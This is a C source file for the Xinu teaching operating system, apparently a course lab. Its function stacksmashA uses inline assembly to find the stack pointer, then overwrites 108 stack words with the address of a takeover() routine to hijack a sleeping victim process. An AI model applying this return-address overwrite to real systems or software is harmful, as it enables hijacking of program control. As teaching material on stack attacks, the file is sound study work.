#include <xinu.h>

extern void takeover(void);
static unsigned long volatile	*esp;
unsigned long volatile	*sp;
extern void stacksmashV();

void stacksmashA()
{
	// since dynamic scheduling is in place, sleep call below allows main to create the victim
	// and victim process to execute it's own sleep statement so we can begin to attack it.
	// sleepms(5);
	// kprintf("takeover() address: %X\n", takeover);
	// kprintf("sleepms() address: %X\n", sleepms);
	// kprintf("STACKMAGIC: %X\n", STACKMAGIC);
	// kprintf("stacksmashV address: %8X\n", stacksmashV);
	// kprintf("stacksmashA address: %8X\n", stacksmashA);

	int i = 0;
	asm("movl %esp,esp");
	sp = esp;
	// unsigned long addr = (unsigned long)takeover;
 //  	asm ("movl %%ecx, (%%eax)"
 //         : /* no outputs */
 //         : "c" (addr) , "a"(sp) 
 //         );

	while( i < 108) //*sp != (unsigned long)STACKMAGIC )
	{
		//kprintf("[before] sp = %X, *sp = %X\n", sp, *sp);
		*sp = takeover;
		// kprintf("[after] sp = %X, *sp = %X\n", sp, *sp);
		sp--;
		// if( *sp == (unsigned long)sleepms )
			i++;
	}
	// *sp = takeover;
	// sp--;
	// *sp = takeover;
	// kprintf("[before] sp = %X, *sp = %X\n", sp, *sp);
	// *sp = takeover;
	// kprintf("[after] sp = %X, *sp = %X\n", sp, *sp);
	return;
}


